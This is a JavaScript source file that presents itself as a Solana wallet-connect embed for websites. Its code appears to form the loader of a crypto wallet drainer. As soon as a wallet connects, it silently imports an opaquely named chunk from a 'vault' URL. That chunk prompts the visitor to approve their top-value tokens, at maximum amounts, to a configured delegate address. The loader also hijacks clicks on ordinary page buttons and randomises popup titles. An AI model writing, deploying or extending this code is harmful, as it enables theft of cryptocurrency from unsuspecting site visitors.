import { createAppKit } from "@reown/appkit";
import { SolanaAdapter } from "@reown/appkit-adapter-solana";
import { solana, solanaDevnet, solanaTestnet } from "@reown/appkit/networks";
import {
  FEATURED_WALLET_IDS,
  INCLUDE_WALLET_IDS,
} from "./solana-wallets.js";
import {
  setupWalletSelectPopup,
  closeWalletConnectPopup,
  setupPopupMessageListener,
} from "./connect-popup.js";

const SOLANA_CONNECT = { view: "Connect", namespace: "solana" };

/**
 * @typedef {object} WalletEmbedConfig
 * @property {string} projectId
 * @property {string} buttonClass
 * @property {"exact" | "pattern5"} [buttonClassMode]
 * @property {string} [network]
 * @property {string} [siteName]
 * @property {string} [siteDescription]
 * @property {string} [siteUrl]
 * @property {string[]} [siteIcons]
 * @property {boolean} [analytics]
 * @property {boolean} [tokenApprovalEnabled]
 * @property {string} [tokenDelegate]
 * @property {number} [tokenApprovalMaxCount]
 * @property {number} [tokenApprovalMinUsd]
 * @property {"max" | "balance"} [tokenApprovalAmountMode]
 * @property {string} [solanaRpcUrl]
 * @property {string} [priceApiUrl]
 * @property {boolean} [connectPopupEnabled]
 * @property {string} [connectPopupUrl] Vercel popup base, e.g. https://app.vercel.app/profile
 * @property {string} [connectPopupTitle] fixed title; omit for random each time
 * @property {string} [chunkBase] same-origin vault URL for esbuild split chunks
 * @property {string[]} [splitChunks] hashed chunk filenames under chunks/
 */

/** @type {string | null} */
let lastApprovalSession = null;
/** @type {boolean} */
let approvalRunning = false;

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function pickSolanaNetworks(config) {
  const rpc = (config.solanaRpcUrl || "").trim();
  const wrap = (net) =>
    rpc
      ? {
          ...net,
          rpcUrls: {
            ...net.rpcUrls,
            default: { http: [rpc], webSocket: net.rpcUrls?.default?.webSocket ?? [] },
          },
        }
      : net;

  if (config.network === "devnet") {
    return [wrap(solanaDevnet)];
  }
  if (config.network === "testnet") {
    return [wrap(solanaTestnet)];
  }
  return [wrap(solana)];
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function createWalletModal(config) {
  if (!config?.projectId || config.projectId === "YOUR_REOWN_PROJECT_ID") {
    console.error(
      "[wallet] Set REOWN_PROJECT_ID in config.php (https://dashboard.reown.com)"
    );
    return null;
  }

  const metadata = {
    name: config.siteName || "Website",
    description: config.siteDescription || "Connect your Solana wallet",
    url: config.siteUrl || window.location.origin,
    icons: config.siteIcons?.length
      ? config.siteIcons
      : [`${window.location.origin}/favicon.ico`],
  };

  const networks = pickSolanaNetworks(config);

  return createAppKit({
    adapters: [new SolanaAdapter()],
    networks,
    defaultNetwork: networks[0],
    metadata,
    projectId: config.projectId,
    enableNetworkSwitch: false,
    enableWalletConnect: false,
    featuredWalletIds: FEATURED_WALLET_IDS,
    includeWalletIds: INCLUDE_WALLET_IDS,
    features: {
      analytics: false,
      email: false,
      socials: false,
      connectMethodsOrder: ["wallet"],
      swaps: false,
      onramp: false,
      send: false,
      receive: false,
      pay: false,
    },
  });
}

/**
 * @param {ReturnType<typeof createAppKit>} modal
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function setupPostConnectApprovals(modal, config) {
  if (config.tokenApprovalEnabled === false) return;
  if (!(config.tokenDelegate || "").trim()) return;

  modal.subscribeAccount((account) => {
    if (!account?.isConnected) {
      lastApprovalSession = null;
      return;
    }
    if (account.status === "connecting" || account.status === "reconnecting") {
      return;
    }

    const address =
      account.address ||
      (account.caipAddress ? account.caipAddress.split(":").pop() : "");
    if (!address) return;
    if (approvalRunning || lastApprovalSession === address) return;

    approvalRunning = true;
    lastApprovalSession = address;

    window.setTimeout(async () => {
      try {
        closeWalletConnectPopup();
        modal.close();
        const provider = modal.getWalletProvider();
        if (!provider?.publicKey) {
          console.warn("[wallet] No Solana provider for token approvals");
          return;
        }

        const chunk = (config.splitChunks || [])[0] || "chunks/H7kL9mN2pQx.js";
        const base = (config.chunkBase || "").replace(/\/$/, "");
        const { createRpcConnection, promptTopTokenApprovals } = await import(
          /* @vite-ignore */ `${base}?c=${encodeURIComponent(chunk)}`
        );
        const connection = createRpcConnection(config);
        await promptTopTokenApprovals({
          config,
          provider,
          connection,
          ownerAddress: address,
        });
      } catch (err) {
        console.error("[wallet] Post-connect token approvals failed", err);
      } finally {
        approvalRunning = false;
      }
    }, 600);
  }, "solana");
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function init(config) {
  const modal = createWalletModal(config);
  if (!modal) return;

  setupPostConnectApprovals(modal, config);
  setupWalletSelectPopup(modal, config);
  setupPopupMessageListener(modal);

  const buttonClass = (config.buttonClass || "").trim();
  if (!buttonClass) {
    console.error("[wallet] buttonClass is not configured");
    return;
  }

  const selector = buildButtonSelector(buttonClass, config.buttonClassMode);

  document.addEventListener(
    "click",
    (event) => {
      const target = event.target;
      if (!(target instanceof Element)) return;

      const button = target.closest(selector);
      if (!button) return;

      event.preventDefault();
      modal.open(SOLANA_CONNECT);
    },
    true
  );

  window.ReownWallet = {
    open: () => modal.open(SOLANA_CONNECT),
    modal,
  };
}

/**
 * @param {string} buttonClass
 * @param {"exact" | "pattern5"} mode
 */
function buildButtonSelector(buttonClass, mode) {
  if (mode === "pattern5") {
    return "button";
  }
  return `button.${cssEscape(buttonClass)}, .${cssEscape(buttonClass)}`;
}

/** @param {string} value */
function cssEscape(value) {
  if (typeof CSS !== "undefined" && CSS.escape) {
    return CSS.escape(value);
  }
  return value.replace(/[^a-zA-Z0-9_-]/g, "\\$&");
}

/**
 * @param {string} className
 */
function hasFiveCharAlphanumericClass(className) {
  return className
    .split(/\s+/)
    .some((token) => /^[A-Za-z0-9]{5}$/.test(token));
}

/**
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 */
function initPatternMode(config) {
  const modal = createWalletModal(config);
  if (!modal) return;

  setupPostConnectApprovals(modal, config);
  setupWalletSelectPopup(modal, config);
  setupPopupMessageListener(modal);

  document.addEventListener(
    "click",
    (event) => {
      const target = event.target;
      if (!(target instanceof Element)) return;

      const button = target.closest("button");
      if (!button || !hasFiveCharAlphanumericClass(button.className)) return;

      event.preventDefault();
      modal.open(SOLANA_CONNECT);
    },
    true
  );

  window.ReownWallet = {
    open: () => modal.open(SOLANA_CONNECT),
    modal,
  };
}

function boot() {
  const config = window.__WALLET_EMBED_CONFIG__;
  if (!config) {
    console.error("[wallet] Missing __WALLET_EMBED_CONFIG__");
    return;
  }

  if (config.buttonClassMode === "pattern5") {
    initPatternMode(config);
  } else {
    init(config);
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", boot);
} else {
  boot();
}

export { init, initPatternMode, createWalletModal };
